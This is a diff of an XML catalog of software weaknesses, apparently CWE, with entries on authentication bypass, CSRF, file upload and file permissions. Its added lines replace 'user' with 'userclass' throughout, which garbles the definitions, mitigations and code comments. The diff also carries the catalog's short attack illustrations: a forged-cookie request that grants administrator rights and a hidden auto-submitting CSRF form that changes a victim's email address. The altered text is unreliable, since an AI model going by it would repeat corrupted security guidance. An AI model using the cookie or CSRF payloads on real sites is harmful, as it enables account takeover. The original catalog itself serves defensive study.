+                              <xhtml:div># Set loggedin and userclass cookies.<xhtml:br/>$q-&gt;cookie(<xhtml:div style="margin-left:10px;">-name =&gt; 'loggedin',<xhtml:br/>-value =&gt; 'true'<xhtml:br/>);</xhtml:div>
+                                 <xhtml:br/>$q-&gt;cookie(<xhtml:div style="margin-left:10px;">-name =&gt; 'userclass',<xhtml:br/>-value =&gt; $q-&gt;param('username')<xhtml:br/>);</xhtml:div>
                               </xhtml:div>
                            </xhtml:div>}</xhtml:div>
                      </xhtml:div>}<xhtml:br/>
-                     <xhtml:br/>if ($q-&gt;cookie('user') eq "Administrator") {<xhtml:div style="margin-left:10px;">DoAdministratorTasks();</xhtml:div>}</xhtml:div>
+                     <xhtml:br/>if ($q-&gt;cookie('userclass') eq "Administrator") {<xhtml:div style="margin-left:10px;">DoAdministratorTasks();</xhtml:div>}</xhtml:div>
                </Example_Code>
                <Body_Text>Unfortunately, this code can be bypassed. The attacker can set the cookies independently so that the code does not check the username and password. The attacker could do this with an HTTP request containing headers such as:</Body_Text>
                <Example_Code Nature="attack">
-                  <xhtml:div>GET /cgi-bin/vulnerable.cgi HTTP/1.1<xhtml:br/>Cookie: user=Administrator<xhtml:br/>Cookie: loggedin=true<xhtml:br/>
+                  <xhtml:div>GET /cgi-bin/vulnerable.cgi HTTP/1.1<xhtml:br/>Cookie: userclass=Administrator<xhtml:br/>Cookie: loggedin=true<xhtml:br/>
                      <xhtml:br/>[body of request]</xhtml:div>
                </Example_Code>
-               <Body_Text>By setting the loggedin cookie to "true", the attacker bypasses the entire authentication check. By using the "Administrator" value in the user cookie, the attacker also gains privileges to administer the software.</Body_Text>
+               <Body_Text>By setting the loggedin cookie to "true", the attacker bypasses the entire authentication check. By using the "Administrator" value in the userclass cookie, the attacker also gains privileges to administer the software.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-117">
                <Intro_Text>In January 2009, an attacker was able to gain administrator access to a Twitter server because the server did not restrict the number of login attempts. The attacker targeted a member of Twitter's support team and was able to successfully guess the member's password using a brute force attack by guessing a large number of common words. After gaining access as the member of the support staff, the attacker used the administrator panel to gain access to 33 accounts that belonged to celebrities and politicians. Ultimately, fake Twitter messages were sent that appeared to come from the compromised accounts.</Intro_Text>
@@ -4460,7 +4460,7 @@
             </Observed_Example>
             <Observed_Example>
                <Reference>CVE-2005-3435</Reference>
-               <Description>product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.</Description>
+               <Description>product authentication succeeds if userclass-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.</Description>
                <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3435</Link>
             </Observed_Example>
             <Observed_Example>
@@ -4707,7 +4707,7 @@
          </Content_History>
       </Weakness>
       <Weakness ID="306" Name="Missing Authentication for Critical Function" Abstraction="Base" Structure="Simple" Status="Draft">
-         <Description>The software does not perform any authentication for functionality that requires a provable user identity or consumes a significant amount of resources.</Description>
+         <Description>The software does not perform any authentication for functionality that requires a provable userclass identity or consumes a significant amount of resources.</Description>
          <Related_Weaknesses>
             <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1000" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="287" View_ID="1003" Ordinal="Primary"/>
@@ -4744,7 +4744,7 @@
                <Method>Automated Static Analysis</Method>
                <Description>
                   <xhtml:p>Automated static analysis is useful for detecting commonly-used idioms for authentication. A tool may be able to analyze related configuration files, such as .htaccess in Apache web servers, or detect the usage of commonly-used authentication libraries.</xhtml:p>
-                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any user and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.</xhtml:p>
+                  <xhtml:p>Generally, automated static analysis tools have difficulty detecting custom authentication schemes. In addition, the software's design may include some functionality that is accessible to any userclass and does not require an established identity; an automated technique that detects the absence of authentication may report false positives.</xhtml:p>
                </Description>
                <Effectiveness>Limited</Effectiveness>
             </Detection_Method>
@@ -4856,9 +4856,9 @@
             <Mitigation>
                <Phase>Architecture and Design</Phase>
                <Description>
-                  <xhtml:p>Divide the software into anonymous, normal, privileged, and administrative areas. Identify which of these areas require a proven user identity, and use a centralized authentication capability.</xhtml:p>
+                  <xhtml:p>Divide the software into anonymous, normal, privileged, and administrative areas. Identify which of these areas require a proven userclass identity, and use a centralized authentication capability.</xhtml:p>
                   <xhtml:p>Identify all potential communication channels, or other means of interaction with the software, to ensure that all channels are appropriately protected. Developers sometimes perform authentication at the primary channel, but open up a secondary channel that is assumed to be private. For example, a login mechanism may be listening on one network port, but after successful authentication, it may open up a second port where it waits for the connection, but avoids authentication because it assumes that only the authenticated party will connect to the port.</xhtml:p>
-                  <xhtml:p>In general, if the software or protocol allows a single session or user state to persist across multiple connections or channels, authentication and appropriate credential management need to be used throughout.</xhtml:p>
+                  <xhtml:p>In general, if the software or protocol allows a single session or userclass state to persist across multiple connections or channels, authentication and appropriate credential management need to be used throughout.</xhtml:p>
                </Description>
             </Mitigation>
             <Mitigation Mitigation_ID="MIT-15">
@@ -4891,15 +4891,15 @@
                            <xhtml:br/>return account;</xhtml:div>
                      </xhtml:div>}</xhtml:div>
                </Example_Code>
-               <Body_Text>However, there is no authentication mechanism to ensure that the user creating this bank account object has the authority to create new bank accounts. Some authentication mechanisms should be used to verify that the user has the authority to create bank account objects.</Body_Text>
-               <Body_Text>The following Java code includes a boolean variable and method for authenticating a user. If the user has not been authenticated then the createBankAccount will not create the bank account object.</Body_Text>
+               <Body_Text>However, there is no authentication mechanism to ensure that the userclass creating this bank account object has the authority to create new bank accounts. Some authentication mechanisms should be used to verify that the userclass has the authority to create bank account objects.</Body_Text>
+               <Body_Text>The following Java code includes a boolean variable and method for authenticating a userclass. If the userclass has not been authenticated then the createBankAccount will not create the bank account object.</Body_Text>
                <Example_Code Nature="good" Language="Java">
                   <xhtml:div>private boolean isUserAuthentic = false;<xhtml:br/>
                      <xhtml:br/>
-                     <xhtml:i>// authenticate user,</xhtml:i>
+                     <xhtml:i>// authenticate userclass,</xhtml:i>
                      <xhtml:br/>
                      <xhtml:br/>
-                     <xhtml:i>// if user is authenticated then set variable to true</xhtml:i>
+                     <xhtml:i>// if userclass is authenticated then set variable to true</xhtml:i>
                      <xhtml:br/>
                      <xhtml:br/>
                      <xhtml:i>// otherwise set variable to false</xhtml:i>
@@ -5067,7 +5067,7 @@
          </Content_History>
       </Weakness>
       <Weakness ID="352" Name="Cross-Site Request Forgery (CSRF)" Abstraction="Compound" Structure="Composite" Status="Stable">
-         <Description>The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the user who submitted the request.</Description>
+         <Description>The web application does not, or can not, sufficiently verify whether a well-formed, valid, consistent request was intentionally provided by the userclass who submitted the request.</Description>
          <Extended_Description>When a web server is designed to receive a request from a client without any mechanism for verifying that it was intentionally sent, then it might be possible for an attacker to trick a client into making an unintentional request to the web server which will be treated as an authentic request. This can be done via a URL, image load, XMLHttpRequest, etc. and can result in exposure of data or unintended code execution.</Extended_Description>
          <Related_Weaknesses>
             <Related_Weakness Nature="ChildOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
@@ -5111,7 +5111,7 @@
                <Impact>Read Application Data</Impact>
                <Impact>Modify Application Data</Impact>
                <Impact>DoS: Crash, Exit, or Restart</Impact>
-               <Note>The consequences will vary depending on the nature of the functionality that is vulnerable to CSRF. An attacker could effectively perform any operations as the victim. If the victim is an administrator or privileged user, the consequences may include obtaining complete control over the web application - deleting or stealing data, uninstalling the product, or using it to launch other attacks against all of the product's users. Because the attacker has the identity of the victim, the scope of CSRF is limited only by the victim's privileges.</Note>
+               <Note>The consequences will vary depending on the nature of the functionality that is vulnerable to CSRF. An attacker could effectively perform any operations as the victim. If the victim is an administrator or privileged userclass, the consequences may include obtaining complete control over the web application - deleting or stealing data, uninstalling the product, or using it to launch other attacks against all of the product's users. Because the attacker has the identity of the victim, the scope of CSRF is limited only by the victim's privileges.</Note>
             </Consequence>
          </Common_Consequences>
          <Detection_Methods>
@@ -5127,7 +5127,7 @@
             </Detection_Method>
             <Detection_Method>
                <Method>Automated Static Analysis</Method>
-               <Description>CSRF is currently difficult to detect reliably using automated techniques. This is because each application has its own implicit security policy that dictates which requests can be influenced by an outsider and automatically performed on behalf of a user, versus which requests require strong confidence that the user intends to make the request. For example, a keyword search of the public portion of a web site is typically expected to be encoded within a link that can be launched automatically when the user clicks on the link.</Description>
+               <Description>CSRF is currently difficult to detect reliably using automated techniques. This is because each application has its own implicit security policy that dictates which requests can be influenced by an outsider and automatically performed on behalf of a userclass, versus which requests require strong confidence that the userclass intends to make the request. For example, a keyword search of the public portion of a web site is typically expected to be encoded within a link that can be launched automatically when the userclass clicks on the link.</Description>
                <Effectiveness>Limited</Effectiveness>
             </Detection_Method>
             <Detection_Method>
@@ -5262,15 +5262,15 @@
             </Mitigation>
             <Mitigation>
                <Phase>Architecture and Design</Phase>
-               <Description>Identify especially dangerous operations. When the user performs a dangerous operation, send a separate confirmation request to ensure that the user intended to perform that operation.</Description>
+               <Description>Identify especially dangerous operations. When the userclass performs a dangerous operation, send a separate confirmation request to ensure that the userclass intended to perform that operation.</Description>
                <Effectiveness_Notes>Note that this can be bypassed using XSS (CWE-79).</Effectiveness_Notes>
             </Mitigation>
             <Mitigation>
                <Phase>Architecture and Design</Phase>
                <Description>
                   <xhtml:p>Use the "double-submitted cookie" method as described by Felten and Zeller:</xhtml:p>
-                  <xhtml:p>When a user visits a site, the site should generate a pseudorandom value and set it as a cookie on the user's machine. The site should require every form submission to include this value as a form value and also as a cookie value. When a POST request is sent to the site, the request should only be considered valid if the form value and the cookie value are the same.</xhtml:p>
-                  <xhtml:p>Because of the same-origin policy, an attacker cannot read or modify the value stored in the cookie. To successfully submit a form on behalf of the user, the attacker would have to correctly guess the pseudorandom value. If the pseudorandom value is cryptographically strong, this will be prohibitively difficult.</xhtml:p>
+                  <xhtml:p>When a userclass visits a site, the site should generate a pseudorandom value and set it as a cookie on the userclass's machine. The site should require every form submission to include this value as a form value and also as a cookie value. When a POST request is sent to the site, the request should only be considered valid if the form value and the cookie value are the same.</xhtml:p>
+                  <xhtml:p>Because of the same-origin policy, an attacker cannot read or modify the value stored in the cookie. To successfully submit a form on behalf of the userclass, the attacker would have to correctly guess the pseudorandom value. If the pseudorandom value is cryptographically strong, this will be prohibitively difficult.</xhtml:p>
                   <xhtml:p>This technique requires Javascript, so it may not work for browsers that have Javascript disabled. [REF-331]</xhtml:p>
                </Description>
                <Effectiveness_Notes>Note that this can probably be bypassed using XSS (CWE-79), or when using web technologies that enable the attacker to read raw headers from HTTP requests.</Effectiveness_Notes>
@@ -5287,8 +5287,8 @@
          </Potential_Mitigations>
          <Demonstrative_Examples>
             <Demonstrative_Example>
-               <Intro_Text>This example PHP code attempts to secure the form submission process by validating that the user submitting the form has a valid session. A CSRF attack would not be prevented by this countermeasure because the attacker forges a request through the user's web browser in which a valid session already exists.</Intro_Text>
-               <Body_Text>The following HTML is intended to allow a user to update a profile.</Body_Text>
+               <Intro_Text>This example PHP code attempts to secure the form submission process by validating that the userclass submitting the form has a valid session. A CSRF attack would not be prevented by this countermeasure because the attacker forges a request through the userclass's web browser in which a valid session already exists.</Intro_Text>
+               <Body_Text>The following HTML is intended to allow a userclass to update a profile.</Body_Text>
                <Example_Code Nature="bad" Language="HTML">
                   <xhtml:div>&lt;form action="/url/profile.php" method="post"&gt;<xhtml:br/>&lt;input type="text" name="firstname"/&gt;<xhtml:br/>&lt;input type="text" name="lastname"/&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="text" name="email"/&gt;<xhtml:br/>&lt;input type="submit" name="submit" value="Update"/&gt;<xhtml:br/>&lt;/form&gt;</xhtml:div>
                </Example_Code>
@@ -5297,18 +5297,18 @@
                   <xhtml:div>// initiate the session in order to validate sessions<xhtml:br/>
                      <xhtml:br/>session_start();<xhtml:br/>
                      <xhtml:br/>
-                     <xhtml:i>//if the session is registered to a valid user then allow update</xhtml:i>
+                     <xhtml:i>//if the session is registered to a valid userclass then allow update</xhtml:i>
                      <xhtml:br/>
                      <xhtml:br/>if (! session_is_registered("username")) {<xhtml:div style="margin-left:10px;">
                         <xhtml:div>
                            <xhtml:br/>echo "invalid session detected!";<xhtml:br/>
                            <xhtml:br/>
-                           <xhtml:i>// Redirect user to login page</xhtml:i>
+                           <xhtml:i>// Redirect userclass to login page</xhtml:i>
                            <xhtml:br/>[...]<xhtml:br/>
                            <xhtml:br/>exit;</xhtml:div>
                      </xhtml:div>}<xhtml:br/>
                      <xhtml:br/>
-                     <xhtml:i>// The user session is valid, so process the request</xhtml:i>
+                     <xhtml:i>// The userclass session is valid, so process the request</xhtml:i>
                      <xhtml:br/>
                      <xhtml:br/>
                      <xhtml:i>// and update the information</xhtml:i>
@@ -5325,7 +5325,7 @@
                      </xhtml:div>}</xhtml:div>
                </Example_Code>
                <Body_Text>This code may look protected since it checks for a valid session. However, CSRF attacks can be staged from virtually any tag or HTML construct, including image tags, links, embed or object tags, or other attributes that load background images.</Body_Text>
-               <Body_Text>The attacker can then host code that will silently change the username and email address of any user that visits the page while remaining logged in to the target web application. The code might be an innocent-looking web page such as:</Body_Text>
+               <Body_Text>The attacker can then host code that will silently change the username and email address of any userclass that visits the page while remaining logged in to the target web application. The code might be an innocent-looking web page such as:</Body_Text>
                <Example_Code Nature="attack" Language="HTML">
                   <xhtml:div>&lt;SCRIPT&gt;<xhtml:br/>function SendAttack () {<xhtml:div style="margin-left:10px;">form.email = "attacker@example.com";<xhtml:br/>
                         <xhtml:i>// send to profile.php</xhtml:i>
@@ -5333,19 +5333,19 @@
                      <xhtml:br/>&lt;BODY onload="javascript:SendAttack();"&gt;<xhtml:br/>
                      <xhtml:br/>&lt;form action="http://victim.example.com/profile.php" id="form" method="post"&gt;<xhtml:br/>&lt;input type="hidden" name="firstname" value="Funny"&gt;<xhtml:br/>&lt;input type="hidden" name="lastname" value="Joke"&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="hidden" name="email"&gt;<xhtml:br/>&lt;/form&gt;</xhtml:div>
                </Example_Code>
-               <Body_Text>Notice how the form contains hidden fields, so when it is loaded into the browser, the user will not notice it. Because SendAttack() is defined in the body's onload attribute, it will be automatically called when the victim loads the web page.</Body_Text>
-               <Body_Text>Assuming that the user is already logged in to victim.example.com, profile.php will see that a valid user session has been established, then update the email address to the attacker's own address. At this stage, the user's identity has been compromised, and messages sent through this profile could be sent to the attacker's address.</Body_Text>
+               <Body_Text>Notice how the form contains hidden fields, so when it is loaded into the browser, the userclass will not notice it. Because SendAttack() is defined in the body's onload attribute, it will be automatically called when the victim loads the web page.</Body_Text>
+               <Body_Text>Assuming that the userclass is already logged in to victim.example.com, profile.php will see that a valid userclass session has been established, then update the email address to the attacker's own address. At this stage, the userclass's identity has been compromised, and messages sent through this profile could be sent to the attacker's address.</Body_Text>
             </Demonstrative_Example>
          </Demonstrative_Examples>
          <Observed_Examples>
             <Observed_Example>
                <Reference>CVE-2004-1703</Reference>
-               <Description>Add user accounts via a URL in an img tag</Description>
+               <Description>Add userclass accounts via a URL in an img tag</Description>
                <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1703</Link>
             </Observed_Example>
             <Observed_Example>
                <Reference>CVE-2004-1995</Reference>
-               <Description>Add user accounts via a URL in an img tag</Description>
+               <Description>Add userclass accounts via a URL in an img tag</Description>
                <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-1995</Link>
             </Observed_Example>
             <Observed_Example>
@@ -5365,7 +5365,7 @@
             </Observed_Example>
             <Observed_Example>
                <Reference>CVE-2005-2059</Reference>
-               <Description>Change another user's settings via a URL or an img tag</Description>
+               <Description>Change another userclass's settings via a URL or an img tag</Description>
                <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2059</Link>
             </Observed_Example>
             <Observed_Example>
@@ -5423,13 +5423,13 @@
          </References>
          <Notes>
             <Note Type="Relationship">
-               <xhtml:p>There can be a close relationship between XSS and CSRF (CWE-352).  An attacker might use CSRF in order to trick the victim into submitting requests to the server in which the requests contain an XSS payload.  A well-known example of this was the Samy worm on MySpace [REF-956]. The worm used XSS to insert malicious HTML sequences into a user's profile and add the attacker as a MySpace friend.  MySpace friends of that victim would then execute the payload to modify their own profiles, causing the worm to propagate exponentially. Since the victims did not intentionally insert the malicious script themselves, CSRF was a root cause.</xhtml:p>
+               <xhtml:p>There can be a close relationship between XSS and CSRF (CWE-352).  An attacker might use CSRF in order to trick the victim into submitting requests to the server in which the requests contain an XSS payload.  A well-known example of this was the Samy worm on MySpace [REF-956]. The worm used XSS to insert malicious HTML sequences into a userclass's profile and add the attacker as a MySpace friend.  MySpace friends of that victim would then execute the payload to modify their own profiles, causing the worm to propagate exponentially. Since the victims did not intentionally insert the malicious script themselves, CSRF was a root cause.</xhtml:p>
             </Note>
             <Note Type="Theoretical">
                <xhtml:p>The CSRF topology is multi-channel:</xhtml:p>
                <xhtml:ol>
-                  <xhtml:li>Attacker (as outsider) to intermediary (as user). The interaction point is either an external or internal channel.</xhtml:li>
-                  <xhtml:li>Intermediary (as user) to server (as victim). The activation point is an internal channel.</xhtml:li>
+                  <xhtml:li>Attacker (as outsider) to intermediary (as userclass). The interaction point is either an external or internal channel.</xhtml:li>
+                  <xhtml:li>Intermediary (as userclass) to server (as victim). The activation point is an internal channel.</xhtml:li>
                </xhtml:ol>
             </Note>
          </Notes>
@@ -6150,7 +6150,7 @@
          <Potential_Mitigations>
             <Mitigation>
                <Phase>Architecture and Design</Phase>
-               <Description>Generate a new, unique filename for an uploaded file instead of using the user-supplied filename, so that no external input is used at all.[REF-422] [REF-423]</Description>
+               <Description>Generate a new, unique filename for an uploaded file instead of using the userclass-supplied filename, so that no external input is used at all.[REF-422] [REF-423]</Description>
             </Mitigation>
             <Mitigation Mitigation_ID="MIT-21">
                <Phase>Architecture and Design</Phase>
@@ -6218,7 +6218,7 @@
          </Potential_Mitigations>
          <Demonstrative_Examples>
             <Demonstrative_Example>
-               <Intro_Text>The following code intends to allow a user to upload a picture to the web server. The HTML code that drives the form on the user end has an input field of type "file".</Intro_Text>
+               <Intro_Text>The following code intends to allow a userclass to upload a picture to the web server. The HTML code that drives the form on the userclass end has an input field of type "file".</Intro_Text>
                <Example_Code Nature="good" Language="HTML">
                   <xhtml:div>&lt;form action="upload_picture.php" method="post" enctype="multipart/form-data"&gt;<xhtml:br/>
                      <xhtml:br/>Choose a file to upload:<xhtml:br/>&lt;input type="file" name="filename"/&gt;<xhtml:br/>&lt;br/&gt;<xhtml:br/>&lt;input type="submit" name="submit" value="Submit"/&gt;<xhtml:br/>
@@ -6639,7 +6639,7 @@
                <Body_Text>If you are working with a multithreaded or otherwise asynchronous environment, ensure that proper locking APIs are used to lock before the if statement; and unlock when it has finished.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-1">
-               <Intro_Text>This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.</Intro_Text>
+               <Intro_Text>This example takes an IP address from a userclass, verifies that it is well formed and then looks up the hostname and copies it into a buffer.</Intro_Text>
                <Example_Code Nature="bad" Language="C">
                   <xhtml:div>void host_lookup(char *user_supplied_addr){<xhtml:div style="margin-left:10px;">
                         <xhtml:div>struct hostent *hp;<xhtml:br/>in_addr_t *addr;<xhtml:br/>char hostname[64];<xhtml:br/>in_addr_t inet_addr(const char *cp);<xhtml:br/>
@@ -7107,7 +7107,7 @@
                </Example_Code>
             </Demonstrative_Example>
             <Demonstrative_Example>
-               <Intro_Text>In Python, the Pickle library handles the serialization and deserialization processes. In this example derived from [REF-467], the code receives and parses data, and afterwards tries to authenticate a user based on validating a token.</Intro_Text>
+               <Intro_Text>In Python, the Pickle library handles the serialization and deserialization processes. In this example derived from [REF-467], the code receives and parses data, and afterwards tries to authenticate a userclass based on validating a token.</Intro_Text>
                <Example_Code Nature="bad" Language="Python">
                   <xhtml:div>try {<xhtml:div style="margin-left:10px;">
                         <xhtml:div>class ExampleProtocol(protocol.Protocol):<xhtml:br/>def dataReceived(self, data):<xhtml:br/>
@@ -7359,7 +7359,7 @@
             <Consequence>
                <Scope>Access Control</Scope>
                <Impact>Gain Privileges or Assume Identity</Impact>
-               <Note>An attacker could gain access to user accounts and access sensitive data used by the user accounts.</Note>
+               <Note>An attacker could gain access to userclass accounts and access sensitive data used by the userclass accounts.</Note>
             </Consequence>
          </Common_Consequences>
          <Potential_Mitigations>
@@ -7378,11 +7378,11 @@
          </Potential_Mitigations>
          <Demonstrative_Examples>
             <Demonstrative_Example Demonstrative_Example_ID="DX-56">
-               <Intro_Text>This code changes a user's password.</Intro_Text>
+               <Intro_Text>This code changes a userclass's password.</Intro_Text>
                <Example_Code Nature="bad" Language="PHP">
-                  <xhtml:div>$user = $_GET['user'];<xhtml:br/>$pass = $_GET['pass'];<xhtml:br/>$checkpass = $_GET['checkpass'];<xhtml:br/>if ($pass == $checkpass) {<xhtml:div style="margin-left:10px;">SetUserPassword($user, $pass);</xhtml:div>}</xhtml:div>
+                  <xhtml:div>$userclass = $_GET['userclass'];<xhtml:br/>$pass = $_GET['pass'];<xhtml:br/>$checkpass = $_GET['checkpass'];<xhtml:br/>if ($pass == $checkpass) {<xhtml:div style="margin-left:10px;">SetUserPassword($userclass, $pass);</xhtml:div>}</xhtml:div>
                </Example_Code>
-               <Body_Text>While the code confirms that the requesting user typed the same new password twice, it does not confirm that the user requesting the password change is the same user whose password will be changed. An attacker can request a change of another user's password and gain control of the victim's account.</Body_Text>
+               <Body_Text>While the code confirms that the requesting userclass typed the same new password twice, it does not confirm that the userclass requesting the password change is the same userclass whose password will be changed. An attacker can request a change of another userclass's password and gain control of the victim's account.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example Demonstrative_Example_ID="DX-57">
                <Intro_Text>The following code reads a password from a properties file and uses the password to connect to a database.</Intro_Text>
@@ -7439,7 +7439,7 @@
             </Observed_Example>
             <Observed_Example>
                <Reference>CVE-2005-3435</Reference>
-               <Description>product authentication succeeds if user-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.</Description>
+               <Description>product authentication succeeds if userclass-provided MD5 hash matches the hash in its database; this can be subjected to replay attacks.</Description>
                <Link>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3435</Link>
             </Observed_Example>
             <Observed_Example>
@@ -7849,7 +7849,7 @@
       </Weakness>
       <Weakness ID="732" Name="Incorrect Permission Assignment for Critical Resource" Abstraction="Class" Structure="Simple" Status="Draft">
          <Description>The product specifies permissions for a security-critical resource in a way that allows that resource to be read or modified by unintended actors.</Description>
-         <Extended_Description>When a resource is given a permissions setting that provides access to a wider range of actors than required, it could lead to the exposure of sensitive information, or the modification of that resource by unintended parties. This is especially dangerous when the resource is related to program configuration, execution or sensitive user data.</Extended_Description>
+         <Extended_Description>When a resource is given a permissions setting that provides access to a wider range of actors than required, it could lead to the exposure of sensitive information, or the modification of that resource by unintended parties. This is especially dangerous when the resource is related to program configuration, execution or sensitive userclass data.</Extended_Description>
          <Related_Weaknesses>
             <Related_Weakness Nature="ChildOf" CWE_ID="285" View_ID="1000" Ordinal="Primary"/>
             <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000"/>
@@ -7866,12 +7866,12 @@
                <Phase>Implementation</Phase>
                <Note>
                   <xhtml:p>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</xhtml:p>
-                  <xhtml:p>The developer might make certain assumptions about the environment in which the product operates - e.g., that the software is running on a single-user system, or the software is only accessible to trusted administrators. When the software is running in a different environment, the permissions become a problem.</xhtml:p>
+                  <xhtml:p>The developer might make certain assumptions about the environment in which the product operates - e.g., that the software is running on a single-userclass system, or the software is only accessible to trusted administrators. When the software is running in a different environment, the permissions become a problem.</xhtml:p>
                </Note>
             </Introduction>
             <Introduction>
                <Phase>Installation</Phase>
-               <Note>The developer may set loose permissions in order to minimize problems when the user first runs the program, then create documentation stating that permissions should be tightened. Since system administrators and users do not always read the documentation, this can result in insecure permissions being left unchanged.</Note>
+               <Note>The developer may set loose permissions in order to minimize problems when the userclass first runs the program, then create documentation stating that permissions should be tightened. Since system administrators and users do not always read the documentation, this can result in insecure permissions being left unchanged.</Note>
             </Introduction>
             <Introduction>
                <Phase>Operation</Phase>
@@ -7938,7 +7938,7 @@
                   <xhtml:p>Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.</xhtml:p>
                   <xhtml:p>Attach the monitor to the process and watch for library functions or system calls on OS resources such as files, directories, and shared memory. Examine the arguments to these calls to infer which permissions are being used.</xhtml:p>
                </Description>
-               <Effectiveness_Notes>Note that this technique is only useful for permissions issues related to system resources. It is not likely to detect application-level business rules that are related to permissions, such as if a user of a blog system marks a post as "private," but the blog system inadvertently marks it as "public."</Effectiveness_Notes>
+               <Effectiveness_Notes>Note that this technique is only useful for permissions issues related to system resources. It is not likely to detect application-level business rules that are related to permissions, such as if a userclass of a blog system marks a post as "private," but the blog system inadvertently marks it as "public."</Effectiveness_Notes>
             </Detection_Method>
             <Detection_Method>
                <Method>Automated Static Analysis - Binary or Bytecode</Method>
@@ -8088,13 +8088,13 @@
          <Potential_Mitigations>
             <Mitigation>
                <Phase>Implementation</Phase>
-               <Description>When using a critical resource such as a configuration file, check to see if the resource has insecure permissions (such as being modifiable by any regular user) [REF-62], and generate an error or even exit the software if there is a possibility that the resource could have been modified by an unauthorized party.</Description>
+               <Description>When using a critical resource such as a configuration file, check to see if the resource has insecure permissions (such as being modifiable by any regular userclass) [REF-62], and generate an error or even exit the software if there is a possibility that the resource could have been modified by an unauthorized party.</Description>
             </Mitigation>
             <Mitigation>
                <Phase>Architecture and Design</Phase>
-               <Description>Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully defining distinct user groups, privileges, and/or roles. Map these against data, functionality, and the related resources. Then set the permissions accordingly. This will allow you to maintain more fine-grained control over your resources. [REF-207]</Description>
+               <Description>Divide the software into anonymous, normal, privileged, and administrative areas. Reduce the attack surface by carefully defining distinct userclass groups, privileges, and/or roles. Map these against data, functionality, and the related resources. Then set the permissions accordingly. This will allow you to maintain more fine-grained control over your resources. [REF-207]</Description>
                <Effectiveness>Moderate</Effectiveness>
-               <Effectiveness_Notes>This can be an effective strategy. However, in practice, it may be difficult or time consuming to define these areas when there are many different resources or user types, or if the applications features change rapidly.</Effectiveness_Notes>
+               <Effectiveness_Notes>This can be an effective strategy. However, in practice, it may be difficult or time consuming to define these areas when there are many different resources or userclass types, or if the applications features change rapidly.</Effectiveness_Notes>
             </Mitigation>
             <Mitigation Mitigation_ID="MIT-22">
                <Phase>Architecture and Design</Phase>
@@ -8112,7 +8112,7 @@
             <Mitigation>
                <Phase>Implementation</Phase>
                <Phase>Installation</Phase>
-               <Description>During program startup, explicitly set the default permissions or umask to the most restrictive setting possible. Also set the appropriate permissions during program installation. This will prevent you from inheriting insecure permissions from any user who installs or runs the program.</Description>
+               <Description>During program startup, explicitly set the default permissions or umask to the most restrictive setting possible. Also set the appropriate permissions during program installation. This will prevent you from inheriting insecure permissions from any userclass who installs or runs the program.</Description>
                <Effectiveness>High</Effectiveness>
             </Mitigation>
             <Mitigation>
@@ -8152,11 +8152,11 @@
                <Body_Text>The "rw-rw-rw-" string indicates that the owner, group, and world (all users) can read the file and write to it.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example>
-               <Intro_Text>This code creates a home directory for a new user, and makes that user the owner of the directory. If the new directory cannot be owned by the user, the directory is deleted.</Intro_Text>
+               <Intro_Text>This code creates a home directory for a new userclass, and makes that userclass the owner of the directory. If the new directory cannot be owned by the userclass, the directory is deleted.</Intro_Text>
                <Example_Code Nature="bad" Language="PHP">
                   <xhtml:div>function createUserDir($username){<xhtml:div style="margin-left:10px;">$path = '/home/'.$username;<xhtml:br/>if(!mkdir($path)){<xhtml:div style="margin-left:10px;">return false;</xhtml:div>}<xhtml:br/>if(!chown($path,$username)){<xhtml:div style="margin-left:10px;">rmdir($path);<xhtml:br/>return false;</xhtml:div>}<xhtml:br/>return true;</xhtml:div>}</xhtml:div>
                </Example_Code>
-               <Body_Text>Because the optional "mode" argument is omitted from the call to mkdir(), the directory is created with the default permissions 0777. Simply setting the new user as the owner of the directory does not explicitly change the permissions of the directory, leaving it with the default. This default allows any user to read and write to the directory, allowing an attack on the user's files. The code also fails to change the owner group of the directory, which may result in access by unexpected groups.</Body_Text>
+               <Body_Text>Because the optional "mode" argument is omitted from the call to mkdir(), the directory is created with the default permissions 0777. Simply setting the new userclass as the owner of the directory does not explicitly change the permissions of the directory, leaving it with the default. This default allows any userclass to read and write to the directory, allowing an attack on the userclass's files. The code also fails to change the owner group of the directory, which may result in access by unexpected groups.</Body_Text>
                <Body_Text>This code may also be vulnerable to Path Traversal (CWE-22) attacks if an attacker supplies a non alphanumeric username.</Body_Text>
             </Demonstrative_Example>
             <Demonstrative_Example>
@@ -8170,7 +8170,7 @@
                <Example_Code Nature="result">
                   <xhtml:div>-rw-r--r-- 1 username 13 Nov 24 17:58 secretFile.out</xhtml:div>
                </Example_Code>
